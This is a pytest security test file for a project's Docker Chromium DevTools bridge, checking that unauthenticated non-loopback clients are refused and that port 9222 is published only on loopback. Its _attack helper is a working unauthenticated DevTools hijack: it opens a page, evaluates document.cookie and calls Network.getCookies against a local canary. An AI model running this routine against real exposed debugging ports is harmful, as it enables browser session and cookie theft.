"""Security tests for the container DevTools bridge.

The entrypoint starts Chromium on a loopback port and bridges it to a listener
with no credential. The documented Docker publish maps that listener onto every
host address. These tests fail while an unauthenticated client that connects to
a non-loopback address can navigate, evaluate script, and read cookies through
that bridge. They pass once that client is refused before any of those actions,
and once every Docker publish of container port 9222 is bound to host loopback.

Run:

    python -m pytest tools/tests/test_unauthenticated_devtools_bridge.py -q

The bridge test needs `socat`, `unshare`, and a local Chrome or Chromium binary
(`CHROME_BIN`, or `/opt/google/chrome/chrome`). It runs `packaging/docker-entrypoint.sh`
unchanged. The native `--remote-debugging-port` launcher is not this bridge:
Chromium binds that port to loopback, and the internal-port test checks that
the same non-loopback client is refused there.
"""
from __future__ import annotations

import base64
import json
import os
import shutil
import signal
import socket
import struct
import subprocess
import sys
import textwrap
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
ENTRYPOINT = REPO / "packaging" / "docker-entrypoint.sh"
sys.path.insert(0, str(REPO / "sdk" / "python"))

import tilion_fortress as tf  # noqa: E402

COOKIE_NAME = "canary"
COOKIE_VALUE = "placeholder-cookie-value"
EXTERNAL_PORT = 9222
INTERNAL_PORT = 9223
PROFILE = "/tmp/tilion-profile"

# Documented and generated publishes of the container's DevTools port.
# A host address is required; Docker's default for an omitted address is every
# interface. Encoded copies live in the README's setup-prompt links.
RAW_PUBLISH = __import__("re").compile(
    r"-p[ \t]+(?:(?P<host>\[[^\]]+\]|[\d.]+):)?(?P<hostport>\d+):9222\b"
)
ENC_PUBLISH = __import__("re").compile(
    r"-p%20(?:(?P<host>\[[^\]]+\]|[\d.]+)%3A)?(?P<hostport>\d+)%3A9222",
    __import__("re").IGNORECASE,
)
LOOPBACK_HOSTS = {"127.0.0.1", "[::1]"}
SCAN_SKIP = {".git", "tools/tests"}


def _non_loopback_ipv4() -> str:
    """An address on a real interface. Loopback would not leave the host."""
    for name in sorted(os.listdir("/sys/class/net")):
        if name == "lo" or name.startswith("docker"):
            continue
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            ifreq = struct.pack("256s", name.encode()[:15])
            res = __import__("fcntl").ioctl(sock.fileno(), 0x8915, ifreq)  # SIOCGIFADDR
        except OSError:
            continue
        finally:
            sock.close()
        ip = socket.inet_ntoa(res[20:24])
        if not ip.startswith("127."):
            return ip
    raise AssertionError("need a non-loopback IPv4 address to reach the published port")


def _chrome_bin() -> str:
    env = os.environ.get("CHROME_BIN")
    candidates = [env] if env else []
    candidates += [
        "/opt/google/chrome/chrome",
        shutil.which("google-chrome-stable") or "",
        shutil.which("google-chrome") or "",
        shutil.which("chromium") or "",
        shutil.which("chromium-browser") or "",
    ]
    for path in candidates:
        if path and os.path.isfile(path) and os.access(path, os.X_OK):
            # The distro wrapper at /usr/local/bin/google-chrome forces its own
            # debugging port. Use the browser binary the entrypoint's flags reach.
            if path.endswith("/google-chrome") and "local/bin" in path:
                continue
            return path
    raise AssertionError("set CHROME_BIN to a Chrome or Chromium binary")


def _recv_http(sock: socket.socket) -> tuple[str, bytes]:
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(65536)
        if not chunk:
            break
        data += chunk
    head, _, rest = data.partition(b"\r\n\r\n")
    headers = head.decode("iso-8859-1", "replace")
    length = 0
    for line in headers.split("\r\n")[1:]:
        if line.lower().startswith("content-length:"):
            length = int(line.split(":", 1)[1].strip())
    while len(rest) < length:
        chunk = sock.recv(65536)
        if not chunk:
            break
        rest += chunk
    return headers, rest


def _connect(ip: str, port: int) -> socket.socket:
    sock = socket.socket()
    sock.settimeout(5)
    sock.bind((ip, 0))
    sock.connect((ip, port))
    return sock


class _Canary(BaseHTTPRequestHandler):
    hits: list[tuple] = []

    def do_GET(self):  # noqa: N802
        type(self).hits.append((self.client_address[0], self.path, self.headers.get("Cookie")))
        body = b"ok"
        self.send_response(200)
        self.send_header("Set-Cookie", f"{COOKIE_NAME}={COOKIE_VALUE}; Path=/")
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


def _ws_send(sock: socket.socket, obj: dict) -> None:
    payload = json.dumps(obj).encode()
    mask = os.urandom(4)
    length = len(payload)
    header = bytearray([0x81])
    if length < 126:
        header.append(0x80 | length)
    elif length < 65536:
        header.append(0x80 | 126)
        header += struct.pack("!H", length)
    else:
        header.append(0x80 | 127)
        header += struct.pack("!Q", length)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    sock.sendall(bytes(header) + mask + masked)


def _ws_recv(sock: socket.socket) -> dict:
    def recvn(n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                raise EOFError("websocket closed")
            buf += chunk
        return buf

    first, second = recvn(2)
    length = second & 0x7F
    if length == 126:
        length = struct.unpack("!H", recvn(2))[0]
    elif length == 127:
        length = struct.unpack("!Q", recvn(8))[0]
    if second & 0x80:
        mask = recvn(4)
        payload = bytes(b ^ mask[i % 4] for i, b in enumerate(recvn(length)))
    else:
        payload = recvn(length)
    return json.loads(payload)


def _attack(ip: str, page_url: str) -> dict:
    """One unauthenticated client. No Authorization header, no debug token."""
    report: dict = {"http": [], "eval": None, "cookies": None, "navigated": False, "error": None}
    try:
        sock = _connect(ip, EXTERNAL_PORT)
        sock.sendall(
            f"PUT /json/new?{page_url} HTTP/1.1\r\nHost: {ip}:{EXTERNAL_PORT}\r\n"
            "Content-Length: 0\r\nConnection: close\r\n\r\n".encode()
        )
        headers, body = _recv_http(sock)
        sock.close()
        status = headers.split("\r\n", 1)[0]
        report["http"].append(status)
        if " 200 " not in f" {status} ":
            return report
        page = json.loads(body)
        ws_url = page["webSocketDebuggerUrl"]
        rest = ws_url[len("ws://"):]
        hostport, path = rest.split("/", 1)
        host, port_s = hostport.rsplit(":", 1)
        sock = _connect(ip, int(port_s))
        key = base64.b64encode(os.urandom(16)).decode()
        sock.sendall(
            (
                f"GET /{path} HTTP/1.1\r\nHost: {hostport}\r\nUpgrade: websocket\r\n"
                "Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
            ).encode()
        )
        hs, _ = _recv_http(sock)
        report["http"].append(hs.split("\r\n", 1)[0])
        if " 101 " not in f" {hs.split(chr(13), 1)[0]} ":
            sock.close()
            return report

        call_id = 0

        def call(method: str, params: dict | None = None) -> dict:
            nonlocal call_id
            call_id += 1
            message = {"id": call_id, "method": method}
            if params:
                message["params"] = params
            _ws_send(sock, message)
            while True:
                incoming = _ws_recv(sock)
                if incoming.get("id") == call_id:
                    return incoming

        nav = call("Page.navigate", {"url": page_url})
        report["navigated"] = "error" not in nav
        time.sleep(0.5)
        report["eval"] = call(
            "Runtime.evaluate", {"expression": "document.cookie", "returnByValue": True}
        )
        report["cookies"] = call("Network.getCookies", {"urls": [page_url]})
        sock.close()
    except Exception as exc:  # refusal is a closed connection or a non-200
        report["error"] = f"{type(exc).__name__}: {exc}"
    return report


@pytest.fixture(scope="module")
def bridge():
    """Run the real entrypoint. The launcher only supplies the browser binary."""
    if not ENTRYPOINT.is_file():
        raise AssertionError(f"missing {ENTRYPOINT}")
    if not shutil.which("socat"):
        raise AssertionError("socat is not on PATH; the entrypoint execs it")
    if not shutil.which("unshare"):
        raise AssertionError("unshare is required to run the entrypoint's /opt/tilion/tilion path")
    chrome = _chrome_bin()
    ip = _non_loopback_ipv4()
    shutil.rmtree(PROFILE, ignore_errors=True)

    _Canary.hits = []
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), _Canary)
    page_url = f"http://127.0.0.1:{httpd.server_address[1]}/"
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()

    launcher = textwrap.dedent(
        f"""\
        #!/bin/bash
        set -eu
        hold=$(mktemp -d)
        mount --bind /opt "$hold"
        mount -t tmpfs tmpfs /opt
        for child in "$hold"/*; do
          [ -e "$child" ] || continue
          name=$(basename "$child")
          mkdir -p "/opt/$name"
          mount --bind "$child" "/opt/$name"
        done
        mkdir -p /opt/tilion
        cat > /opt/tilion/tilion << 'WRAP'
        #!/bin/bash
        exec {chrome} --disable-gpu --disable-dev-shm-usage --no-first-run --no-default-browser-check "$@"
        WRAP
        chmod 755 /opt/tilion/tilion
        exec {ENTRYPOINT}
        """
    )
    log_path = Path("/tmp/fortress-entrypoint-test.log")
    log = open(log_path, "w")
    proc = subprocess.Popen(
        ["unshare", "--user", "--map-root-user", "--mount", "bash", "-c", launcher],
        stdout=log,
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    deadline = time.time() + 30
    up = False
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        try:
            with socket.create_connection(("127.0.0.1", EXTERNAL_PORT), 0.3):
                up = True
                break
        except OSError:
            time.sleep(0.2)
    if not up:
        log.flush()
        detail = log_path.read_text(errors="replace")[-2000:]
        os.killpg(proc.pid, signal.SIGKILL)
        raise AssertionError(f"entrypoint did not open :{EXTERNAL_PORT}\n{detail}")

    yield {"ip": ip, "page_url": page_url, "log": log_path}

    httpd.shutdown()
    try:
        os.killpg(proc.pid, signal.SIGKILL)
    except ProcessLookupError:
        pass
    proc.wait(timeout=5)
    log.close()
    shutil.rmtree(PROFILE, ignore_errors=True)


def test_unauthenticated_non_loopback_client_cannot_drive_devtools(bridge):
    before = len(_Canary.hits)
    report = _attack(bridge["ip"], bridge["page_url"])
    hits = _Canary.hits[before:]
    blob = json.dumps(report)
    assert hits == [], (
        "DevTools performed a navigation before refusing the unauthenticated client: "
        f"{hits} report={blob}"
    )
    assert COOKIE_VALUE not in blob, (
        "unauthenticated non-loopback client read the browser cookie through the bridge: "
        + blob
    )
    assert report["navigated"] is False, blob
    evaluated = (
        (report.get("eval") or {})
        .get("result", {})
        .get("result", {})
        .get("value")
    )
    assert evaluated in (None, ""), blob


def test_internal_devtools_port_rejects_the_same_non_loopback_client(bridge):
    """Chromium's own port stays on loopback. The bridge is what publishes it."""
    ip = bridge["ip"]
    with pytest.raises(OSError):
        sock = _connect(ip, INTERNAL_PORT)
        sock.close()


def _publish_violations() -> list[str]:
    bad = []
    for dirpath, dirnames, filenames in os.walk(REPO):
        rel_dir = os.path.relpath(dirpath, REPO)
        dirnames[:] = [
            name
            for name in dirnames
            if os.path.relpath(os.path.join(dirpath, name), REPO) not in SCAN_SKIP
            and name not in SCAN_SKIP
        ]
        if rel_dir == "tools/tests" or rel_dir.startswith("tools/tests" + os.sep):
            continue
        for name in filenames:
            path = Path(dirpath) / name
            if path.suffix.lower() not in {".md", ".py", ".js", ".yml", ".yaml", ".sh", ""}:
                if path.name not in {"Dockerfile", "bug_report.yml"}:
                    continue
            try:
                text = path.read_text(errors="replace")
            except OSError:
                continue
            rel = path.relative_to(REPO)
            for pattern in (RAW_PUBLISH, ENC_PUBLISH):
                for match in pattern.finditer(text):
                    host = match.group("host")
                    if host not in LOOPBACK_HOSTS:
                        line = text.count("\n", 0, match.start()) + 1
                        bad.append(f"{rel}:{line}: {match.group(0)}")
    return bad


def test_documented_docker_publish_binds_host_loopback():
    bad = _publish_violations()
    assert bad == [], "Docker publish of 9222 is not bound to host loopback:\n" + "\n".join(bad)


def test_python_sdk_docker_publish_binds_host_loopback(monkeypatch):
    captured = {}

    monkeypatch.setattr(tf.shutil, "which", lambda name: "/usr/bin/docker" if name == "docker" else None)

    def fake_run(args, check, stdout):
        captured["args"] = args
        return subprocess.CompletedProcess(args, 0)

    monkeypatch.setattr(tf.subprocess, "run", fake_run)
    tf.Fortress(port=9222)._start_docker()
    args = captured["args"]
    spec = args[args.index("-p") + 1]
    assert spec.startswith("127.0.0.1:") or spec.startswith("[::1]:"), spec


def test_node_sdk_docker_publish_binds_host_loopback(tmp_path):
    capture = tmp_path / "calls.jsonl"
    script = REPO / "tools/tests/devtools_bridge_node/check_publish.mjs"
    loader = REPO / "tools/tests/devtools_bridge_node/loader.mjs"
    proc = subprocess.run(
        ["node", "--experimental-loader", loader.as_uri(), str(script)],
        cwd=REPO,
        env={**os.environ, "FORTRESS_TEST_CAPTURE": str(capture)},
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr
